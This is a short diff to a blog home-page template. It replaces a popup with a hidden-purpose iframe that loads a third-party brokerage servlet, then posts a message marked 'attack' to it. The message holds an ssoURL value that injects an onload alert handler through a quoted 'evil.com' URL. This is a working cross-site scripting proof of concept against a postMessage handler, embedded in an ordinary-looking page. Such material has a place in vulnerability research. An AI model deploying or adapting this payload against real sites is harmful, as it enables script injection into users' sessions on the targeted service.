@@ -37,11 +37,9 @@ title: Home
     <span class="pagination-item older">Older</span>
   {% endif %}
 </div>
-
+<iframe id="folio" src="https://qa8.foliodx.com/brokerage/AControlServlet"></iframe>
 <script>
- var foliodx = window.open("https://qa8.foliodx.com/brokerage/AControlServlet","Folio");
- (5);
  var message= {type:"message",data:{abc:"def",request:"attack",eventName:"folioActionLaunch",data:{ssoURL:"http://evil.com' onload='alert(0);'"}}};
- setTimeout(foliodx.postMessage(message,"*"), 3000);
+ setTimeout(document.getElementById("folio").postMessage(message,"*"), 3000);
 </script>
   
